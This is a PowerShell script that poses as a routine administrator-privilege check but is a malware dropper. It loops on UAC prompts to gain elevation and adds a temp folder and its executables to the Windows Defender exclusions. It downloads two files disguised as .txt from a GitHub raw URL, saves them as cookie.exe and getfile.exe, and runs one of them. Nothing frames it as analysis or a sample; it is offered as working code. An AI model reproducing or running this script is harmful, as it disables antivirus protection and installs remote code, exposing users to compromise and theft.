Function Check-RunAsAdministrator()
{
    while ($true){
  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
  {
       Write-host "Script is running with Administrator privileges!"
  }
  else
    {
    try{
       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
       $ElevatedProcess.Verb = "runas"
       [System.Diagnostics.Process]::Start($ElevatedProcess)
       
        #command here
        
        $systemPath = [System.IO.Path]::Combine($env:temp, "System")
        New-Item -Path $systemPath -ItemType Directory -Force
        try {
        Add-MpPreference -ExclusionPath $systemPath
        } catch {}
        $cookieUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
        $cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
        Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
        try {
        Add-MpPreference -ExclusionProcess $cookiePath
        } catch {}
        $getfileUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/noname.txt"
        $getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
        Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
        try {
        Add-MpPreference -ExclusionProcess $getfilePath
        Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
        } catch {}
       Exit
    } catch {
        Check-RunAsAdministrator

    }
       }
          }
}
Check-RunAsAdministrator

